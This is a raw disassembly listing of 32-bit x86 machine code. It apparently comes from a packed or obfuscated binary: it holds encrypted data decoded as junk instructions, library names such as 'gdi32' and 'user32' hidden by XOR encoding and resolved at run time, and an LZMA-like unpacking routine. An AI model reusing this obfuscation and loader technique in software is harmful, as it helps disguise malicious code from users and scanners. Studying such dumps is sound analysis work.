  4256e6:	pushf  
  4256e7:	add    al,0x84
  4256e9:	xchg   edi,eax
  4256ea:	mov    al,0xf
  4256ec:	cmp    DWORD PTR [ecx],ebp
  4256ee:	add    BYTE PTR [edx-0x52],cl
  4256f1:	sti    
  4256f2:	loopne 0x42575e
  4256f4:	imul   edi,DWORD PTR [esi],0x18f09e25
  4256fa:	xchg   esp,eax
  4256fb:	outs   dx,DWORD PTR ds:[esi]
  4256fc:	jl     0x425683
  4256fe:	mov    WORD PTR [edx-0x1d],?
  425701:	cmp    DWORD PTR [ebx+0xf0a148a],edx
  425707:	(bad)  
  425708:	fdiv   QWORD PTR [ebp+ebp*2+0x1b]
  42570c:	sub    eax,0x404c079e
  425711:	and    eax,0x8d6accd5
  425716:	inc    ebx
  425717:	and    eax,0x2a493f84
  42571c:	fdiv   DWORD PTR [bx+0x27]
  425720:	cmc    
  425721:	shl    DWORD PTR [esi+0x7bcf681d],0x40
  425728:	lds    eax,FWORD PTR ds:0xbbd4658c
  42572e:	mov    edi,0x3aeb9b7b
  425733:	sub    DWORD PTR ds:0xa4eaa330,ebp
  425739:	aaa    
  42573a:	lea    esi,[eax-0x7]
  42573d:	ds xchg edx,eax
  42573f:	fs jo  0x4257a7
  425742:	xlat   BYTE PTR ds:[ebx]
  425743:	push   cs
  425744:	push   0xffffff9b
  425746:	(bad)  
  425747:	in     eax,dx
  425748:	(bad)  
  425749:	cmp    DWORD PTR [edx+0x0],ebp
  42574c:	add    eax,0xbabb7739
  425751:	inc    eax
  425752:	sbb    eax,0xd8a9183b
  425757:	leave  
  425758:	jb     0x4257ac
  42575a:	mov    edx,DWORD PTR [ebp+0x3a98eaec]
  425760:	or     BYTE PTR [edx+0x61751a12],dh
  425766:	out    0xe6,eax
  425768:	mov    bh,0x87
  42576a:	fist   DWORD PTR [ecx-0x3e52cc48]
  425770:	cmp    DWORD PTR [ebp-0x26230dd4],ecx
  425776:	mov    esp,0xb53bc273
  42577b:	or     eax,0x4823e938
  425780:	adc    al,dl
  425782:	ja     0x4257b2
  425784:	test   BYTE PTR [ecx],ch
  425786:	push   0xd6186fba
  42578b:	pop    esi
  42578c:	jp     0x4257cf
  42578e:	inc    ebp
  42578f:	lea    esp,ds:0xb7a9e66f
  425795:	imul   edx,esi,0x8470ebee
  42579b:	cwde   
  42579c:	call   0x7f1fbe52
  4257a1:	xchg   edx,eax
  4257a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257a3:	or     bl,0x4e
  4257a6:	scas   eax,DWORD PTR es:[edi]
  4257a7:	or     BYTE PTR [esi-0x4],ch
  4257aa:	adc    ebp,DWORD PTR [edi]
  4257ac:	lahf   
  4257ad:	xor    ebx,esp
  4257af:	cmp    al,0x5
  4257b1:	scas   al,BYTE PTR es:[edi]
  4257b2:	dec    ebp
  4257b3:	add    BYTE PTR [edi+0xa],bh
  4257b6:	fsub   DWORD PTR [edx-0xc5e0222]
  4257bc:	jne    0x4257a2
  4257be:	jge    0x425804
  4257c0:	pusha  
  4257c1:	outs   dx,BYTE PTR ds:[esi]
  4257c2:	push   edi
  4257c3:	ins    DWORD PTR es:[edi],dx
  4257c4:	jne    0x425781
  4257c6:	xor    BYTE PTR [eax],bh
  4257c8:	jmp    DWORD PTR [ecx+esi*8]
  4257cb:	outs   dx,BYTE PTR ds:[esi]
  4257cc:	shr    BYTE PTR [esi+0xf4ae119],1
  4257d2:	int    0x1f
  4257d4:	push   ebp
  4257d5:	dec    ebp
  4257d6:	jb     0x425800
  4257d8:	int3   
  4257d9:	aam    0x5d
  4257db:	in     al,0xa1
  4257dd:	or     al,0x68
  4257df:	and    edi,esi
  4257e1:	lds    ebx,FWORD PTR [ebx-0x3f]
  4257e4:	add    ecx,DWORD PTR [ecx-0x6a034e1b]
  4257ea:	(bad)  
  4257eb:	nop
  4257ec:	icebp  
  4257ed:	movsx  ebp,BYTE PTR [eax+0x417406ac]
  4257f4:	int    0x49
  4257f6:	ret    0xdffe
  4257f9:	adc    edi,DWORD PTR [edi+esi*4-0xd]
  4257fd:	xor    esp,edi
  4257ff:	mov    bl,0xde
  425801:	mov    eax,0x8ad1ca0c
  425806:	or     al,0x19
  425808:	mov    eax,ds:0xf4da2545
  42580d:	int    0x5b
  42580f:	ins    DWORD PTR es:[edi],dx
  425810:	jo     0x42582b
  425812:	movd   mm5,eax
  425815:	and    DWORD PTR [ecx+0x23f4edb3],0xcf614fb7
  42581f:	mov    esi,0x499e601b
  425824:	jo     0x42589b
  425826:	dec    edx
  425827:	cmp    al,dl
  425829:	add    al,0xa5
  42582b:	aas    
  42582c:	xchg   esp,eax
  42582d:	sub    esi,edx
  42582f:	inc    esp
  425830:	jp     0x4257dd
  425832:	ficom  DWORD PTR [esi+eiz*8+0xc]
  425836:	mov    ecx,0x722da053
  42583b:	stos   DWORD PTR es:[edi],eax
  42583c:	and    BYTE PTR [eax-0x19],al
  42583f:	mov    edi,0xb192be35
  425844:	dec    ebp
  425845:	(bad)  
  425846:	and    ecx,eax
  425848:	and    al,0x53
  42584a:	loopne 0x425853
  42584c:	mov    WORD PTR [ecx+0x69],es
  42584f:	sbb    eax,0xf27d67be
  425854:	je     0x425841
  425856:	xchg   DWORD PTR [edx-0x5],eax
  425859:	out    0x5b,eax
  42585b:	mov    ecx,0xc53f5c88
  425860:	ja     0x425897
  425862:	inc    ecx
  425863:	loop   0x42586a
  425865:	jp     0x4258ae
  425867:	sahf   
  425868:	out    dx,al
  425869:	push   0x2f
  42586b:	pop    edi
  42586c:	idiv   DWORD PTR [eax-0x3e]
  42586f:	ins    BYTE PTR es:[edi],dx
  425870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425871:	and    BYTE PTR [ecx+0x72],ah
  425874:	cmp    eax,0xa2cb2827
  425879:	or     al,0x82
  42587b:	ror    BYTE PTR [eax+0x24],1
  42587e:	fdivr  QWORD PTR [edi-0x3f8a63c5]
  425884:	push   ecx
  425885:	cmp    BYTE PTR [ebx],0xf8
  425888:	je     0x4258dd
  42588e:	mov    DWORD PTR [ebp-0xc],esi
  425891:	mov    eax,DWORD PTR [ebp-0xc]
  425894:	mov    esi,DWORD PTR [ebp+0xc]
  425897:	xor    eax,ecx
  425899:	lea    eax,[eax*8+0x1939820]
  4258a0:	mov    eax,DWORD PTR [esi+eax*1]
  4258a3:	mov    DWORD PTR [ebp+0xc],eax
  4258a6:	mov    eax,DWORD PTR [ebp-0x4]
  4258a9:	mov    esi,DWORD PTR [ebp-0x8]
  4258ac:	xor    eax,ecx
  4258ae:	xor    esi,ecx
  4258b0:	add    esi,edx
  4258b2:	add    eax,edx
  4258b4:	imul   eax,esi
  4258b7:	mov    esi,DWORD PTR [ebp+0xc]
  4258ba:	cmp    esi,eax
  4258bc:	je     0x4258dd
  4258c2:	mov    eax,DWORD PTR [ebp-0x4]
  4258c5:	xor    eax,ecx
  4258c7:	mov    ecx,DWORD PTR [ebp+0xc]
  4258ca:	add    eax,edx
  4258cc:	imul   eax,ecx
  4258cf:	add    eax,DWORD PTR [ebp+0x8]
  4258d2:	mov    DWORD PTR [ebp+0xc],eax
  4258d5:	mov    eax,DWORD PTR [ebp+0xc]
  4258d8:	jmp    0x4258ee
  4258dd:	mov    eax,DWORD PTR [ebp-0x4]
  4258e0:	mov    esi,DWORD PTR [ebp-0x8]
  4258e3:	xor    esi,ecx
  4258e5:	xor    eax,ecx
  4258e7:	add    esi,edx
  4258e9:	add    eax,edx
  4258eb:	imul   eax,esi
  4258ee:	pop    edi
  4258ef:	pop    esi
  4258f0:	leave  
  4258f1:	ret    0x8
	...
  425904:	int3   
  425905:	cmp    al,0xf3
  425907:	dec    ebp
  425908:	add    BYTE PTR [eax],al
  42590a:	add    BYTE PTR [eax],al
  42590c:	add    al,BYTE PTR [eax]
  42590e:	add    BYTE PTR [eax],al
  425910:	add    BYTE PTR ss:[eax],al
  425913:	add    BYTE PTR [eax],ah
  425915:	pop    ecx
  425916:	add    al,BYTE PTR [eax]
  425918:	and    BYTE PTR [ebp+0x2],cl
  42591b:	add    BYTE PTR [eax],al
  42591d:	add    BYTE PTR [eax],al
  42591f:	add    BYTE PTR [edx+0x53],dl
  425922:	inc    esp
  425923:	push   ebx
  425924:	sti    
  425925:	jbe    0x425921
  425927:	je     0x42592b
  425929:	inc    ebx
  42592a:	inc    ebp
  42592b:	inc    edi
  42592c:	scas   eax,DWORD PTR es:[edi]
  42592d:	mov    fs,WORD PTR [edx-0x50e9203]
  425933:	add    BYTE PTR [ecx],0x0
  425936:	add    BYTE PTR [eax],al
  425938:	inc    edi
  425939:	cmp    bl,BYTE PTR [ebx+edx*2+0x79]
  42593d:	jae    0x42595f
  42593f:	inc    esp
  425940:	imul   esi,DWORD PTR [edx+0x20],0x5c6e6957
  425947:	inc    esi
  425948:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  425950:	outs   dx,BYTE PTR ds:[esi]
  425951:	jae    0x4259bc
  425953:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  42595b:	or     BYTE PTR [ecx],al
  42595d:	add    BYTE PTR [eax],al
  42595f:	push   ebx
  425960:	mov    eax,ebx
  425962:	xchg   ecx,eax
  425963:	mov    eax,DWORD PTR [ebp+0x8]
  425966:	cmp    eax,0xf89c85a5
  42596b:	jne    0x425e2c
  425971:	mov    eax,DWORD PTR [ebp+0xc]
  425974:	cmp    eax,0xf89c85a2
  425979:	jne    0x425e2c
  42597f:	mov    eax,DWORD PTR [ebp+0x24]
  425982:	mov    DWORD PTR [ebp-0x4],eax
  425985:	mov    eax,DWORD PTR [ebp-0x4]
  425988:	mov    eax,DWORD PTR [eax+0x1d8]
  42598e:	mov    eax,DWORD PTR [eax]
  425990:	mov    eax,DWORD PTR [eax]
  425992:	mov    DWORD PTR [ebp-0x8],eax
  425995:	mov    BYTE PTR [ebp-0x18],0x1a
  425999:	mov    BYTE PTR [ebp-0x17],0x1f
  42599d:	mov    BYTE PTR [ebp-0x16],0x18
  4259a1:	mov    BYTE PTR [ebp-0x15],0x4e
  4259a5:	mov    BYTE PTR [ebp-0x14],0x51
  4259a9:	mov    BYTE PTR [ebp-0x13],0x83
  4259ad:	mov    BYTE PTR [ebp-0x20],0xc
  4259b1:	mov    BYTE PTR [ebp-0x1f],0xe
  4259b5:	mov    BYTE PTR [ebp-0x1e],0x1c
  4259b9:	mov    BYTE PTR [ebp-0x1d],0x11
  4259bd:	mov    BYTE PTR [ebp-0x1c],0x4e
  4259c1:	mov    BYTE PTR [ebp-0x1b],0x51
  4259c5:	mov    BYTE PTR [ebp-0x1a],0x83
  4259c9:	mov    BYTE PTR [ebp-0x28],0xe
  4259cd:	mov    BYTE PTR [ebp-0x27],0x1b
  4259d1:	mov    BYTE PTR [ebp-0x26],0x17
  4259d5:	mov    BYTE PTR [ebp-0x25],0xa
  4259d9:	mov    BYTE PTR [ebp-0x24],0x20
  4259dd:	mov    BYTE PTR [ebp-0x23],0x13
  4259e1:	mov    BYTE PTR [ebp-0x22],0x18
  4259e5:	mov    BYTE PTR [ebp-0x21],0x83
  4259e9:	xor    ecx,ecx
  4259eb:	lea    eax,[ebp+ecx*1-0x18]
  4259ef:	movzx  edx,BYTE PTR [eax]
  4259f2:	xor    edx,0x7e
  4259f5:	add    edx,0x3
  4259f8:	inc    ecx
  4259f9:	mov    BYTE PTR [eax],dl
  4259fb:	cmp    ecx,0x6
  4259fe:	jb     0x4259eb
  425a00:	xor    ecx,ecx
  425a02:	lea    eax,[ebp+ecx*1-0x20]
  425a06:	movzx  edx,BYTE PTR [eax]
  425a09:	xor    edx,0x7e
  425a0c:	add    edx,0x3
  425a0f:	inc    ecx
  425a10:	mov    BYTE PTR [eax],dl
  425a12:	cmp    ecx,0x7
  425a15:	jb     0x425a02
  425a17:	xor    ecx,ecx
  425a19:	lea    eax,[ebp+ecx*1-0x28]
  425a1d:	movzx  edx,BYTE PTR [eax]
  425a20:	xor    edx,0x7e
  425a23:	add    edx,0x3
  425a26:	inc    ecx
  425a27:	mov    BYTE PTR [eax],dl
  425a29:	cmp    ecx,0x8
  425a2c:	jb     0x425a19
  425a2e:	lea    eax,[ebp-0x2c]
  425a31:	mov    DWORD PTR [ebp-0x8],eax
  425a34:	mov    ecx,DWORD PTR [ebp-0x8]
  425a37:	mov    eax,0x7113fccf
  425a3c:	mov    DWORD PTR [ecx],eax
  425a3e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425a41:	push   esi
  425a42:	push   edi
  425a43:	mov    esi,0x4e3e
  425a48:	mov    ebx,0x3272f5
  425a4d:	cmp    ecx,eax
  425a4f:	jne    0x425b1a
  425a55:	lea    eax,[esi+0x39]
  425a58:	mov    WORD PTR [ebp-0x78],ax
  425a5c:	mov    eax,esi
  425a5e:	mov    WORD PTR [ebp-0x76],ax
  425a62:	add    eax,0x3f
  425a65:	mov    WORD PTR [ebp-0x74],ax
  425a69:	lea    eax,[esi-0x2]
  425a6c:	mov    WORD PTR [ebp-0x72],ax
  425a70:	add    eax,0x43
  425a73:	mov    ecx,eax
  425a75:	lea    eax,[esi-0x9]
  425a78:	mov    WORD PTR [ebp-0x66],ax
  425a7c:	mov    eax,esi
  425a7e:	mov    WORD PTR [ebp-0x64],ax
  425a82:	add    eax,0xffffffec
  425a85:	mov    WORD PTR [ebp-0x62],ax
  425a89:	mov    eax,0x443
  425a8e:	mov    WORD PTR [ebp-0x60],ax
  425a92:	mov    eax,0x5670
  425a97:	mov    WORD PTR [ebp-0x5e],ax
  425a9b:	mov    eax,0x6110
  425aa0:	mov    WORD PTR [ebp-0x5c],ax
  425aa4:	lea    eax,[ebp-0xe0]
  425aaa:	push   eax
  425aab:	mov    eax,DWORD PTR [ebp+0xc]
  425aae:	mov    edi,0x75108ae
  425ab3:	xor    eax,edi
  425ab5:	add    eax,ebx
  425ab7:	push   eax
  425ab8:	mov    WORD PTR [ebp-0x70],cx
  425abc:	lea    ecx,[esi-0xe]
  425abf:	mov    edx,ecx
  425ac1:	lea    eax,[ebp-0x78]
  425ac4:	push   eax
  425ac5:	mov    eax,DWORD PTR [ebp-0x4]
  425ac8:	mov    eax,DWORD PTR [eax+0x198]
  425ace:	mov    WORD PTR [ebp-0x6e],dx
  425ad2:	mov    edx,0x4f8a
  425ad7:	mov    WORD PTR [ebp-0x6c],dx
  425adb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425ae2:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425ae9:	mov    DWORD PTR [ebp-0xe0],0x1
  425af3:	mov    DWORD PTR [ebp-0xdc],0x255
  425afd:	push   DWORD PTR [eax]
  425aff:	mov    eax,DWORD PTR [ebp+0x10]
  425b02:	call   eax
  425b04:	mov    DWORD PTR [ebp-0x8],eax
  425b07:	mov    eax,DWORD PTR [ebp-0x8]
  425b0a:	test   eax,eax
  425b0c:	je     0x425b1f
  425b0e:	xor    DWORD PTR ds:0x76586876,0x87687666
  425b18:	jmp    0x425b1f
  425b1a:	mov    edi,0x75108ae
  425b1f:	mov    eax,DWORD PTR [ebp-0x4]
  425b22:	mov    ecx,DWORD PTR [eax+0x18c]
  425b28:	xor    eax,eax
  425b2a:	cmp    DWORD PTR [ecx],eax
  425b2c:	jne    0x425d9f
  425b32:	mov    ecx,DWORD PTR [ebp-0x4]
  425b35:	mov    ecx,DWORD PTR [ecx+0x17c]
  425b3b:	mov    DWORD PTR [ecx],eax
  425b3d:	mov    ecx,DWORD PTR [ebp-0x4]
  425b40:	mov    ecx,DWORD PTR [ecx+0x180]
  425b46:	mov    DWORD PTR [ecx],eax
  425b48:	mov    eax,0x4e6d
  425b4d:	mov    WORD PTR [ebp-0x9c],ax
  425b54:	mov    eax,esi
  425b56:	mov    WORD PTR [ebp-0x9a],ax
  425b5d:	mov    eax,0x4e7d
  425b62:	mov    WORD PTR [ebp-0x98],ax
  425b69:	add    eax,0xffffffc0
  425b6c:	mov    WORD PTR [ebp-0x96],ax
  425b73:	mov    eax,0x4f8e
  425b78:	mov    WORD PTR [ebp-0x94],ax
  425b7f:	mov    eax,0x4e32
  425b84:	mov    WORD PTR [ebp-0x92],ax
  425b8b:	add    eax,0x4d
  425b8e:	mov    WORD PTR [ebp-0x90],ax
  425b95:	mov    eax,0x4e30
  425b9a:	mov    WORD PTR [ebp-0x8e],ax
  425ba1:	mov    eax,esi
  425ba3:	mov    WORD PTR [ebp-0x8c],ax
  425baa:	mov    eax,0x4e31
  425baf:	mov    WORD PTR [ebp-0x8a],ax
  425bb6:	mov    eax,0x99fd
  425bbb:	mov    WORD PTR [ebp-0x88],ax
  425bc2:	mov    eax,0x8d62
  425bc7:	mov    WORD PTR [ebp-0x86],ax
  425bce:	mov    eax,0xd66f
  425bd3:	mov    WORD PTR [ebp-0x84],ax
  425bda:	mov    eax,0xd783
  425bdf:	mov    WORD PTR [ebp-0x82],ax
  425be6:	mov    eax,0x2780
  425beb:	mov    WORD PTR [ebp-0x80],ax
  425bef:	mov    eax,0x4780
  425bf4:	mov    WORD PTR [ebp-0x7e],ax
  425bf8:	mov    eax,0x4e33
  425bfd:	push   0x8
  425bff:	mov    WORD PTR [ebp-0x7c],ax
  425c03:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425c0a:	mov    DWORD PTR [ebp-0xc],0x83181320
  425c11:	lea    eax,[ebp-0x10]
  425c14:	pop    ecx
  425c15:	mov    dl,BYTE PTR [eax]
  425c17:	xor    dl,0x7e
  425c1a:	add    dl,0x3
  425c1d:	mov    BYTE PTR [eax],dl
  425c1f:	inc    eax
  425c20:	dec    ecx
  425c21:	jne    0x425c15
  425c23:	lea    eax,[ebp-0x10]
  425c26:	mov    DWORD PTR [ebp-0xdc],eax
  425c2c:	lea    eax,[ebp-0xe0]
  425c32:	push   eax
  425c33:	mov    eax,DWORD PTR [ebp+0xc]
  425c36:	xor    eax,edi
  425c38:	add    eax,ebx
  425c3a:	push   eax
  425c3b:	mov    eax,DWORD PTR [ebp-0x4]
  425c3e:	add    eax,0x66
  425c41:	push   eax
  425c42:	mov    eax,DWORD PTR [ebp-0x4]
  425c45:	mov    eax,DWORD PTR [eax+0x198]
  425c4b:	mov    DWORD PTR [ebp-0xe0],0x1
  425c55:	push   DWORD PTR [eax]
  425c57:	mov    eax,DWORD PTR [ebp+0x10]
  425c5a:	call   eax
  425c5c:	mov    ecx,DWORD PTR [ebp+0x8]
  425c5f:	xor    ecx,edi
  425c61:	add    ecx,ebx
  425c63:	mov    DWORD PTR [ebp-0x8],eax
  425c66:	cmp    eax,ecx
  425c68:	jne    0x425c83
  425c6a:	mov    eax,ds:0x33730bcc
  425c6f:	or     eax,0x22150bcf
  425c74:	mov    ds:0x33730bcc,eax
  425c79:	add    eax,0x3372e92f
  425c7e:	mov    ds:0x33730bcc,eax
  425c83:	mov    ecx,0x4e66
  425c88:	mov    eax,ecx
  425c8a:	mov    WORD PTR [ebp-0x40],ax
  425c8e:	add    eax,0x5
  425c91:	mov    edx,eax
  425c93:	mov    WORD PTR [ebp-0x3e],dx
  425c97:	mov    edx,0x4f93
  425c9c:	mov    WORD PTR [ebp-0x3c],dx
  425ca0:	add    edx,0xfffffff8
  425ca3:	mov    WORD PTR [ebp-0x3a],dx
  425ca7:	mov    edx,0x4f89
  425cac:	mov    WORD PTR [ebp-0x38],dx
  425cb0:	add    edx,0x3
  425cb3:	mov    WORD PTR [ebp-0x36],dx
  425cb7:	mov    edx,0x4f87
  425cbc:	mov    WORD PTR [ebp-0x34],dx
  425cc0:	mov    WORD PTR [ebp-0x32],cx
  425cc4:	mov    ecx,esi
  425cc6:	mov    WORD PTR [ebp-0x30],cx
  425cca:	lea    ecx,[edx-0x1]
  425ccd:	mov    edx,ecx
  425ccf:	mov    WORD PTR [ebp-0x54],dx
  425cd3:	mov    edx,eax
  425cd5:	mov    WORD PTR [ebp-0x52],dx
  425cd9:	mov    edx,0x4e73
  425cde:	mov    WORD PTR [ebp-0x50],dx
  425ce2:	mov    WORD PTR [ebp-0x4e],ax
  425ce6:	lea    eax,[edx-0xa]
  425ce9:	mov    WORD PTR [ebp-0x4c],ax
  425ced:	add    eax,0x3
  425cf0:	mov    WORD PTR [ebp-0x4a],ax
  425cf4:	lea    eax,[edx-0xc]
  425cf7:	mov    WORD PTR [ebp-0x48],ax
  425cfb:	mov    WORD PTR [ebp-0x46],cx
  425cff:	mov    WORD PTR [ebp-0x44],si
  425d03:	mov    eax,DWORD PTR [ebp+0x8]
  425d06:	movzx  ecx,WORD PTR [ebp-0x54]
  425d0a:	xor    eax,edi
  425d0c:	add    eax,ebx
  425d0e:	xor    eax,ecx
  425d10:	mov    WORD PTR [ebp-0x54],ax
  425d14:	mov    eax,DWORD PTR [ebp+0x8]
  425d17:	movzx  ecx,WORD PTR [ebp-0x40]
  425d1b:	xor    eax,edi
  425d1d:	add    eax,ebx
  425d1f:	xor    eax,ecx
  425d21:	mov    WORD PTR [ebp-0x40],ax
  425d25:	xor    eax,eax
  425d27:	mov    WORD PTR [ebp-0xf4],ax
  425d2e:	mov    WORD PTR [ebp-0x108],ax
  425d35:	mov    edi,DWORD PTR [ebp+0x24]
  425d38:	lea    eax,[ebp-0xf4]
  425d3e:	lea    edx,[ebp-0x54]
  425d41:	mov    DWORD PTR [ebp-0xe0],0x2
  425d4b:	mov    DWORD PTR [ebp-0xdc],eax
  425d51:	call   0x428789
  425d56:	mov    DWORD PTR [ebp-0xd8],eax
  425d5c:	lea    eax,[ebp-0xe0]
  425d62:	push   eax
  425d63:	mov    eax,DWORD PTR [ebp+0xc]
  425d66:	xor    eax,0x75108ae
  425d6b:	add    eax,ebx
  425d6d:	push   eax
  425d6e:	lea    eax,[ebp-0x9c]
  425d74:	push   eax
  425d75:	push   DWORD PTR [ebp-0x8]
  425d78:	mov    eax,DWORD PTR [ebp+0x10]
  425d7b:	call   eax
  425d7d:	mov    edi,DWORD PTR [ebp+0x24]
  425d80:	lea    eax,[ebp-0x108]
  425d86:	lea    edx,[ebp-0x40]
  425d89:	mov    DWORD PTR [ebp-0xdc],eax
  425d8f:	call   0x428789
  425d94:	mov    DWORD PTR [ebp-0xd8],eax
  425d9a:	mov    edi,0x75108ae
  425d9f:	mov    eax,DWORD PTR [ebp+0x14]
  425da2:	push   DWORD PTR [ebp-0x4]
  425da5:	push   DWORD PTR [ebp+0x20]
  425da8:	push   DWORD PTR [ebp+0x1c]
  425dab:	push   DWORD PTR [ebp+0x18]
  425dae:	push   DWORD PTR [ebp+0x10]
  425db1:	push   DWORD PTR [ebp+0x8]
  425db4:	push   DWORD PTR [ebp+0xc]
  425db7:	call   0x42702a
  425dbc:	test   eax,eax
  425dbe:	je     0x425e02
  425dc0:	add    DWORD PTR [ebp-0x4],eax
  425dc3:	push   DWORD PTR [ebp-0x4]
  425dc6:	lea    esi,[ebp+0x4]
  425dc9:	call   0x42621a
  425dce:	mov    eax,DWORD PTR [ebp-0x4]
  425dd1:	mov    eax,DWORD PTR [eax+0x1c8]
  425dd7:	mov    eax,DWORD PTR [eax]
  425dd9:	xor    eax,edi
  425ddb:	add    eax,ebx
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	jne    0x425df8
  425de2:	mov    ecx,DWORD PTR [ebp-0x4]
  425de5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425deb:	push   DWORD PTR [ecx]
  425ded:	mov    eax,DWORD PTR [eax+0x1e0]
  425df3:	call   DWORD PTR [eax+0x28]
  425df6:	jmp    0x425e02
  425df8:	mov    eax,DWORD PTR [eax+0x17c]
  425dfe:	mov    eax,DWORD PTR [eax]
  425e00:	add    DWORD PTR [esi],eax
  425e02:	mov    eax,DWORD PTR [ebp-0x4]
  425e05:	mov    eax,DWORD PTR [eax+0x1dc]
  425e0b:	dec    DWORD PTR [eax]
  425e0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425e10:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425e16:	mov    eax,DWORD PTR [eax]
  425e18:	lea    eax,[ecx+eax*4]
  425e1b:	mov    ecx,DWORD PTR [ebp-0x4]
  425e1e:	mov    ecx,DWORD PTR [ecx+0x17c]
  425e24:	mov    eax,DWORD PTR [eax]
  425e26:	mov    ecx,DWORD PTR [ecx]
  425e28:	add    DWORD PTR [eax],ecx
  425e2a:	pop    edi
  425e2b:	pop    esi
  425e2c:	pop    ebx
  425e2d:	leave  
  425e2e:	ret    0x20
  425e31:	push   edi
  425e32:	push   esi
  425e33:	push   ebx
  425e34:	push   ebp
  425e35:	mov    ebp,esp
  425e37:	mov    eax,DWORD PTR [ebp+0x24]
  425e3a:	add    DWORD PTR [ebp+0x28],eax
  425e3d:	push   eax
  425e3e:	cld    
  425e3f:	mov    esi,DWORD PTR [ebp+0x18]
  425e42:	add    DWORD PTR [ebp+0x1c],esi
  425e45:	push   esi
  425e46:	mov    esi,DWORD PTR [ebp+0x14]
  425e49:	lods   eax,DWORD PTR ds:[esi]
  425e4a:	xchg   edx,eax
  425e4b:	push   edx
  425e4c:	mov    cl,BYTE PTR [esi-0x2]
  425e4f:	or     eax,0xffffffff
  425e52:	shl    eax,cl
  425e54:	not    eax
  425e56:	push   eax
  425e57:	mov    cl,dh
  425e59:	or     eax,0xffffffff
  425e5c:	shl    eax,cl
  425e5e:	not    eax
  425e60:	push   eax
  425e61:	add    cl,dl
  425e63:	mov    edi,esi
  425e65:	sub    esp,0xc
  425e68:	sub    eax,eax
  425e6a:	inc    eax
  425e6b:	push   eax
  425e6c:	push   eax
  425e6d:	push   eax
  425e6e:	push   eax
  425e6f:	push   eax
  425e70:	push   edi
  425e71:	sub    esi,esi
  425e73:	push   esi
  425e74:	or     ebx,0xffffffff
  425e77:	mov    eax,0x300
  425e7c:	shl    eax,cl
  425e7e:	lea    ecx,[eax+0x736]
  425e84:	mov    eax,0x4000400
  425e89:	shr    ecx,1
  425e8b:	rep stos DWORD PTR es:[edi],eax
  425e8d:	push   0x5
  425e8f:	pop    ecx
  425e90:	call   0x42617b
  425e95:	loop   0x425e90
  425e97:	lea    esi,[esi]
  425e99:	lea    edi,[edi]
  425e9b:	mov    edi,DWORD PTR [ebp-0x4]
  425e9e:	mov    eax,DWORD PTR [ebp-0x10]
  425ea1:	sub    edi,DWORD PTR [ebp+0x24]
  425ea4:	and    eax,edi
  425ea6:	mov    DWORD PTR [ebp-0x18],eax
  425ea9:	mov    al,0x0
  425eab:	call   0x426193
  425eb0:	jne    0x425f4b
  425eb6:	mov    cl,BYTE PTR [ebp-0xc]
  425eb9:	and    edi,DWORD PTR [ebp-0x14]
  425ebc:	shl    edi,cl
  425ebe:	sub    cl,0x8
  425ec1:	neg    cl
  425ec3:	shr    esi,cl
  425ec5:	pop    eax
  425ec6:	add    edi,esi
  425ec8:	pop    esi
  425ec9:	lea    edi,[edi+edi*2]
  425ecc:	shl    edi,0x8
  425ecf:	cmp    al,0x7
  425ed1:	pop    edx
  425ed2:	lea    ecx,[esi+edi*2+0xe6c]
  425ed9:	push   ecx
  425eda:	push   esi
  425edb:	mov    esi,0x100
  425ee0:	push   eax
  425ee1:	mov    al,0x1
  425ee3:	jb     0x425f19
  425ee5:	mov    edi,DWORD PTR [ebp-0x4]
  425ee8:	sub    edi,DWORD PTR [ebp-0x24]
  425eeb:	movzx  edi,BYTE PTR [edi]
  425eee:	mov    ebp,DWORD PTR [ebp-0x34]
  425ef1:	shl    edi,1
  425ef3:	mov    ecx,esi
  425ef5:	and    esi,edi
  425ef7:	add    ecx,esi
  425ef9:	lea    ebp,[ebp+ecx*2+0x0]
  425efd:	call   0x4261b2
  425f02:	mov    ecx,eax
  425f04:	shr    esi,0x8
  425f07:	and    ecx,0x1
  425f0a:	cmp    esi,ecx
  425f0c:	mov    esi,0x100
  425f11:	jne    0x425f21
  425f13:	cmp    eax,esi
  425f15:	jb     0x425eee
  425f17:	jmp    0x425f2d
  425f19:	mov    ebp,DWORD PTR [ebp-0x34]
  425f1c:	call   0x4261b2
  425f21:	inc    eax
  425f22:	inc    esi
  425f23:	sub    eax,0x1
  425f26:	sub    esi,0x1
  425f29:	cmp    eax,esi
  425f2b:	jb     0x425f19
  425f2d:	pop    edx
  425f2e:	inc    edx
  425f2f:	cmp    edx,0x5
  425f32:	dec    edx
  425f33:	mov    ecx,edx
  425f35:	jb     0x425f46
  425f37:	inc    edx
  425f38:	cmp    edx,0xb
  425f3b:	dec    edx
  425f3c:	mov    cl,0x4
  425f3e:	dec    cl
  425f40:	jb     0x425f46
  425f42:	mov    cl,0x7
  425f44:	dec    cl
  425f46:	sub    edx,ecx
  425f48:	push   edx
  425f49:	jmp    0x425f9a
  425f4b:	mov    al,0xc1
  425f4d:	dec    al
  425f4f:	call   0x4261a3
  425f54:	jne    0x425f6a
  425f56:	pop    eax
  425f57:	pop    edi
  425f58:	pop    edx
  425f59:	pop    ecx
  425f5a:	pop    edx
  425f5b:	pop    ecx
  425f5c:	push   DWORD PTR [esp]
  425f5f:	push   ecx
  425f60:	push   edx
  425f61:	mov    edx,0x664
  425f66:	mov    cl,0x0
  425f68:	jmp    0x425fdd
  425f6a:	mov    al,0xcd
  425f6c:	dec    al
  425f6e:	call   0x4261a3
  425f73:	jne    0x425fa3
  425f75:	mov    al,0xf1
  425f77:	dec    al
  425f79:	call   0x426193
  425f7e:	jne    0x425fd3
  425f80:	pop    eax
  425f81:	cmp    al,0x7
  425f83:	mov    al,0x9
  425f85:	jb     0x425f89
  425f87:	mov    al,0xb
  425f89:	push   eax
  425f8a:	mov    esi,DWORD PTR [ebp-0x4]
  425f8d:	sub    esi,DWORD PTR [ebp-0x24]
  425f90:	cmp    esi,DWORD PTR [ebp+0x24]
  425f93:	jb     0x42616a
